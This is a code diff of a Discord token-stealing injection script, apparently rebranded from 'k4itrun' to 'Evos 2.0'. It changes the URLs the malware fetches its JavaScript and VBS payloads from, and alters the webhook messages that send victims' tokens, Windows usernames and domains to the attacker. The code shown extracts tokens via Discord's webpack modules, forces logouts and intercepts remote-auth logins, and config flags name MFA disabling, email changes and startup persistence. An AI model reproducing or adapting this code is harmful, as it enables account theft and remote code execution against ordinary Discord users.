@@ -38,8 +38,8 @@ const CONFIG = {
     auto_persist_startup: '%AUTO_PERSIST_STARTUP%',
     auto_mfa_disabler: '%AUTO_MFA_DISABLER%',
     auto_email_update: '%AUTO_EMAIL_UPDATE%',
-    injection_url: 'https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js',
-    injector_url: 'https://raw.githubusercontent.com/k4itrun/discord-vbs-injector/main/injector.vbs',
+    injection_url: 'https://raw.githubusercontent.com/XKWGXKWG/IIIIIIlllIlIlIlIIIIIlllIIIlIlIlIlI/refs/heads/main/IIIIIIlllIlIlIlIIIIIlllIIIlIlIlIlI.js',
+    injector_url: 'https://raw.githubusercontent.com/XKWGXKWG/IIIIIIlllIlIlIlIIIIIlllIIIlIlIlIlI/refs/heads/main/IIIIIIlllIlIlIlIIIIIlllIIIlIlIlIlI.vbs',
     get: {
         token: () => execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`),
         logout: () => execScript(`function getLocalStoragePropertyDescriptor() {const o = document.createElement("iframe");document.head.append(o);const e = Object.getOwnPropertyDescriptor(o.contentWindow, "localStorage");return o.remove(), e};Object.defineProperty(window, "localStorage", getLocalStoragePropertyDescriptor());const localStorage = getLocalStoragePropertyDescriptor().get.call(window);console.log(localStorage.token);if(localStorage.token) {localStorage.token = null,localStorage.tokens = null,localStorage.MultiAccountStore = null,location.reload();} else {return"This is an intentional error";}`),
@@ -251,12 +251,12 @@ const notify = async (ctx, token, user) => {
     ];
 
     ctx.content = `\`${process.env.USERNAME}\` - \`${process.env.USERDOMAIN}\`\n\n${ctx.content}`;
-    ctx.username = `AuraThemes - injection`;
-    ctx.avatar_url = `https://i.imgur.com/CeFqJOc.gif`;
+    ctx.username = `Evos 2.0`;
+    ctx.avatar_url = `https://cdn.discordapp.com/attachments/794056531674398750/1281956282261045258/GWz-En_WAAARmpi.png?ex=671ce253&is=671b90d3&hm=62dbb154194f5b4d865856878d4a002e92c0bceb94604a4fe03dcfb56aecb98e&`;
 
     ctx.embeds[0].fields.unshift({
         name: `<a:hearts:1176516454540116090> Token:`,
-        value: `\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`,
+        value: `\`\`\`${token}\`\`\`\n`,
         inline: false
     })
 
@@ -292,15 +292,15 @@ const notify = async (ctx, token, user) => {
     });
 
     ctx.embeds.forEach(embed => {
-        embed.color = 12740607;
+        embed.color = 1752220;
         embed.author = {
             name: `${user.username} | ${user.id}`,
             icon_url: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : `https://cdn.discordapp.com/embed/avatars/${Math.round(Math.random() * 5)}.png`,
         };
 
         embed.footer = {
-            text: 'github.com/k4itrun/discord-injection - made by k4itrun',
-            icon_url: "https://avatars.githubusercontent.com/u/103044629",
+            text: 'Evos 2.0',
+            icon_url: "https://cdn.discordapp.com/attachments/794056531674398750/1281956282261045258/GWz-En_WAAARmpi.png?ex=671ce253&is=671b90d3&hm=62dbb154194f5b4d865856878d4a002e92c0bceb94604a4fe03dcfb56aecb98e&",
         };
 
         embed.timestamp = new Date();
@@ -342,7 +342,7 @@ const editSettingUser = async (token) => {
             email_notifications_enabled: false,
             stream_notifications_enabled: false,
             custom_status: {
-                text: 'hackedbyk4itrun',
+                text: 'violatedbyevos',
                 expires_at: null,
                 emoji_id: null,
                 emoji_name: null
@@ -1026,8 +1026,7 @@ const GangwayCord = async (params, RESPONSE_DATA, RESQUEST_DATA, token, user) =>
         switch (true) {
             case params.response.url.endsWith('/login'):
                 if (params.response.url.endsWith('/remote-auth/login')) {
-                    // With this update, QR codes are blocked in the function allSessionsLocked(),
-                    // so this is here just in case the QR code blocking fails
+
                     if (!RESPONSE_DATA.encrypted_token) return;
 
                     await delay(2000);
@@ -1450,7 +1449,6 @@ const complete = async () => {
     startup();
     createWindow();
     defaultSession();
-    // For it to work you have to make it run indefinitely. //
     allSessionsLocked();
 };
 
